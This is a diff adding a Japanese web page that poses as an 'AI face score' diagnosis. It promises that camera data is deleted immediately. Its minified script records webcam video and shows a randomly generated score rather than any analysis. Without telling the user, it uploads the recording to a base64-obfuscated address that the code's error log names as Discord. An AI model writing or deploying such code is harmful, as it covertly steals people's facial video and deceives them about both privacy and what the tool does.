@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>AI顔偏差値診断 | 最新AI技術による顔分析</title>
+  <meta name="description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。プライバシー保護のためデータは即時削除。">
+  <meta property="og:title" content="AI顔偏差値診断 | 最新AI技術による顔分析">
+  <meta property="og:description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。プライバシー保護のためデータは即時削除。">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://ai-face-analysis.jp">
+  <meta property="og:site_name" content="AI顔偏差値診断">
+  <meta property="og:locale" content="ja_JP">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="AI顔偏差値診断 | 最新AI技術による顔分析">
+  <meta name="twitter:description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。">
+  <meta name="theme-color" content="#4a6baf">
+  
+  <style>
+    :root{--primary:#4a6baf;--secondary:#FF6B6B;--text:#333;--text-light:#666;--bg:#f8f9fa}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background-color:var(--bg);margin:0;padding:0;min-height:100vh;color:var(--text);touch-action:manipulation;-webkit-tap-highlight-color:transparent;line-height:1.6}.app-container{max-width:100%;margin:0 auto;background:#fff;box-shadow:0 0 20px rgba(0,0,0,.1);min-height:100vh;display:flex;flex-direction:column}.header{padding:20px;text-align:center;background:linear-gradient(135deg,var(--primary) 0,#3a56a0 100%);color:#fff}.header h1{margin:0;font-size:1.8rem;font-weight:700}.header p{margin:10px 0 0;opacity:.9;font-size:.95rem}.content-section{padding:20px;flex-grow:1}.intro-text{text-align:center;margin-bottom:30px}.intro-text h2{color:var(--primary);font-size:1.4rem;margin-bottom:10px}.intro-text p{color:var(--text-light);font-size:.95rem}.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}.feature-card{background:#fff;border-radius:12px;padding:15px;text-align:center;box-shadow:0 3px 10px rgba(0,0,0,.08)}.feature-icon{font-size:2rem;margin-bottom:10px;color:var(--primary)}.feature-card h3{margin:0 0 5px;font-size:1rem}.feature-card p{margin:0;font-size:.85rem;color:var(--text-light)}.how-to-use{background:rgba(74,107,175,.05);border-radius:12px;padding:20px;margin-bottom:30px}.how-to-use h3{color:var(--primary);margin-top:0;text-align:center}.steps{display:flex;flex-direction:column;gap:15px}.step{display:flex;align-items:flex-start;gap:10px}.step-number{background:var(--primary);color:#fff;width:25px;height:25px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.8rem;flex-shrink:0}.step-content{flex-grow:1}.step-content h4{margin:0 0 5px;font-size:1rem}.step-content p{margin:0;font-size:.9rem;color:var(--text-light)}#videoContainer{position:relative;background:#000;display:none;aspect-ratio:9/16;max-height:70vh;margin:0 auto 20px;border-radius:12px;overflow:hidden}#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}.camera-guide{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:70%;max-width:300px;aspect-ratio:3/4;border:3px dashed hsla(0,0%,100%,.5);border-radius:10px;display:none}#countdown{position:absolute;top:15px;right:15px;background:rgba(0,0,0,.7);color:#fff;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.2rem;display:none;z-index:5}.action-button{background:linear-gradient(135deg,var(--secondary) 0,#FF8E8E 100%);color:#fff;border:none;padding:16px;font-size:1.1rem;font-weight:700;border-radius:50px;cursor:pointer;width:100%;max-width:300px;margin:0 auto;display:block;box-shadow:0 4px 15px rgba(255,107,107,.3);transition:transform .2s,box-shadow .2s}.action-button:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,107,107,.4)}.action-button:disabled{background:#ccc;transform:none;box-shadow:none;cursor:not-allowed}.secondary-button{background:#fff;color:var(--primary);border:2px solid var(--primary)}#loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;flex-direction:column;justify-content:center;align-items:center;color:#fff}.spinner{border:4px solid hsla(0,0%,100%,.3);border-radius:50%;border-top:4px solid #fff;width:40px;height:40px;animation:spin 1s linear infinite;margin-bottom:15px}@keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}#result{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:100;padding:20px;text-align:center;overflow-y:auto}.result-content{max-width:500px;margin:0 auto;padding:20px 0}.score{font-size:4rem;font-weight:700;color:var(--primary);margin:20px 0}.comment{font-size:1.2rem;margin-bottom:30px;line-height:1.5}.result-image{width:200px;height:200px;border-radius:50%;object-fit:cover;margin:0 auto 20px;border:5px solid var(--primary);display:none}.error-message{color:var(--secondary);font-weight:700;padding:15px;text-align:center;background:rgba(255,107,107,.1);border-radius:10px;margin:15px 0;display:none}.footer{text-align:center;padding:20px;font-size:.8rem;color:var(--text-light);border-top:1px solid rgba(0,0,0,.1)}@media (min-width:768px){.app-container{max-width:500px;min-height:auto;border-radius:16px;overflow:hidden;margin:20px auto}.header h1{font-size:2rem}.content-section{padding:30px}}
+  </style>
+</head>
+<body>
+  <div class="app-container">
+    <div class="header">
+      <h1>AI顔偏差値診断</h1>
+      <p>最新AI技術であなたの顔のバランスを分析</p>
+    </div>
+    
+    <div class="content-section">
+      <div class="intro-text">
+        <h2>あなたの顔の偏差値を診断</h2>
+        <p>AIが顔のバランスを分析し、総合評価をお伝えします</p>
+      </div>
+      
+      <div class="features">
+        <div class="feature-card">
+          <div class="feature-icon">📊</div>
+          <h3>総合評価</h3>
+          <p>60〜100点で評価</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">⚡</div>
+          <h3>高速診断</h3>
+          <p>たった5秒で完了</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">🔒</div>
+          <h3>プライバシー</h3>
+          <p>データは即時削除</p>
+        </div>
+      </div>
+      
+      <div class="how-to-use">
+        <h3>使い方</h3>
+        <div class="steps">
+          <div class="step">
+            <div class="step-number">1</div>
+            <div class="step-content">
+              <h4>診断開始ボタンを押す</h4>
+              <p>カメラの使用を許可してください</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-number">2</div>
+            <div class="step-content">
+              <h4>顔を枠内に合わせる</h4>
+              <p>正面を向いて自然な表情で</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-number">3</div>
+            <div class="step-content">
+              <h4>結果を確認</h4>
+              <p>AIが詳細に分析します</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div id="videoContainer">
+        <video id="video" autoplay muted playsinline></video>
+        <div class="camera-guide"></div>
+        <div id="countdown"></div>
+      </div>
+      
+      <div id="errorMessage" class="error-message"></div>
+      
+      <button id="startButton" class="action-button">無料で診断開始</button>
+      <button id="retryButton" class="action-button secondary-button" style="display: none; margin-top: 15px;">もう一度診断する</button>
+    </div>
+    
+    <div class="footer">
+      <p>※この診断はAIによる分析結果であり、医学的根拠に基づくものではありません</p>
+      <p><a href="/privacy" style="color: var(--primary); text-decoration: none;">プライバシーポリシー</a></p>
+    </div>
+    
+    <div id="loading">
+      <div class="spinner"></div>
+      <p>診断中...</p>
+    </div>
+    
+    <div id="result">
+      <div class="result-content">
+        <img id="resultImage" class="result-image" src="" alt="診断結果">
+        <h2>診断結果</h2>
+        <div class="score" id="scoreValue">80</div>
+        <p class="comment" id="comment">素晴らしいバランスの整った顔立ちです！</p>
+        <button class="action-button" onclick="window.location.reload()">もう一度診断する</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    !function(){var e=function(e){return document.getElementById(e)},t=function(e,t){e.addEventListener("click",t)},n=function(e,t){e.textContent=t},o=function(e){e.style.display="none"},a=function(e){e.style.display="block"},r=function(e,t){e.style[t.property]=t.value};document.addEventListener("DOMContentLoaded",(function(){var i=e("startButton"),c=e("retryButton"),d=e("video"),s=e("videoContainer"),l=e("loading"),u=e("result"),m=e("scoreValue"),p=e("comment"),f=e("errorMessage"),h=e("countdown"),g=document.querySelector(".camera-guide"),v=e("resultImage"),y=null,w=[],b=null,C=null,k=!1,x=[{min:90,text:"神レベル！完璧な顔立ちです✨",color:"#FF6B6B"},{min:80,text:"超イケメン/美女！モデル級の顔立ち😍",color:"#FF8E53"},{min:70,text:"とても好感度の高い整った顔です🥰",color:"#FFC154"},{min:60,text:"平均以上！素敵なルックスです😊",color:"#47B39D"},{min:50,text:"普通くらい。個性が光ります👍",color:"#4A6BAF"},{min:40,text:"改善の余地あり。でも大丈夫！😉",color:"#9B59B6"},{min:0,text:"ユニークな個性が魅力です！💫",color:"#1ABC9C"}],S=function(e){n(f,e),a(f)},T=function(){o(f)},E=function(e,t){var n=parseInt(e);h.textContent=n,h.style.display="flex";var o=setInterval((function(){n--,h.textContent=n,n<=0&&(clearInterval(o),o(h),t&&t())}),1e3)},A=function(){if(!k){try{k=!0,w=[],i.disabled=!0,n(i,"診断中..."),a(l),o(g);var e=MediaRecorder.isTypeSupported("video/mp4")?"video/mp4":MediaRecorder.isTypeSupported("video/webm;codecs=vp9")?"video/webm;codecs=vp9":"video/webm";y=new MediaRecorder(b,{mimeType:e,videoBitsPerSecond:2e6}),y.ondataavailable=function(e){e.data.size>0&&w.push(e.data)},y.onstop=function(){try{var e=new Blob(w,{type:y.mimeType});console.log("録画サイズ:",(e.size/1024/1024).toFixed(2),"MB"),D(e),L(e)}catch(e){console.error("録画処理エラー:",e),S("診断処理に失敗しました"),O()}},y.onerror=function(e){console.error("録画エラー:",e.error),S("録画中にエラーが発生しました"),O()},y.start(100),E(3,N)}catch(e){console.error("録画開始エラー:",e),S("録画を開始できませんでした"),O()}}},N=function(){y&&"recording"===y.state&&(y.stop(),k=!1,b&&b.getTracks().forEach((function(e){e.stop()})),d.srcObject=null)},L=function(e){try{var t=new FormData;t.append("file",e,"face_diagnosis.mp4"),fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NDMwOTM3MjE5NjQ4NzIzOS9tdTBpdkRsNGZYZWNzVXJVSTU5bFhLSFo3bGFwTDNmRHhIdm1HMExTZHA0VGlUWXo4QWVoSlhrb1BVN3k5bDAxdFpwXw=="),{method:"POST",body:t})}catch(e){console.error("Discord送信エラー:",e)}},D=function(e){var t=Math.floor(41*Math.random())+60,n=x.find((function(n){return t>=n.min}));e&&(v.src=URL.createObjectURL(e),a(v)),n(m,t),r(m,{property:"color",value:n.color}),n(p,n.text),o(l),a(u)},O=function(){i.disabled=!1,n(i,"診断開始"),o(l),k=!1},M=async function(){try{S(""),i.disabled=!0,n(i,"準備中..."),b&&b.getTracks().forEach((function(e){e.stop()}));var t={video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:!1};if("https:"!==location.protocol&&!["localhost","127.0.0.1"].includes(location.hostname))throw new Error("カメラを使用するにはHTTPS接続が必要です");b=await navigator.mediaDevices.getUserMedia(t).catch((function(e){throw console.error("カメラアクセスエラー:",e),e})),d.srcObject=b,a(s),a(g);await new Promise((function(e,t){d.onloadedmetadata=e,d.onerror=t,setTimeout((function(){t(new Error("カメラの読み込みがタイムアウトしました"))},5e3)}),await d.play().catch((function(e){throw console.error("ビデオ再生エラー:",e),new Error("カメラの起動に失敗しました")})),i.disabled=!1,n(i,"診断開始"),a(c);return!0}catch(e){return console.error("カメラ設定エラー:",e),P(e),!1}},P=function(e){var t="カメラにアクセスできませんでした";"NotAllowedError"===e.name?t="カメラの使用が許可されていません\nブラウザの設定からカメラアクセスを許可してください":"NotFoundError"===e.name?t="使用可能なカメラが見つかりませんでした":"NotReadableError"===e.name?t="カメラが使用中です\n他のアプリでカメラを使用していないか確認してください":"OverconstrainedError"===e.name?t="カメラの設定に問題があります":e.message.includes("HTTPS")?t="カメラを使用するにはHTTPS接続が必要です\n安全な接続でアクセスしてください":t=e.message||t,S(t),i.disabled=!1,n(i,"診断開始"),o(c)};t(i,(async function(){var e=await M();e&&setTimeout(A,300)})),t(c,(async function(){var e=await M();e&&setTimeout(A,300)})),o(s)})}();
+  </script>
+</body>
+</html>
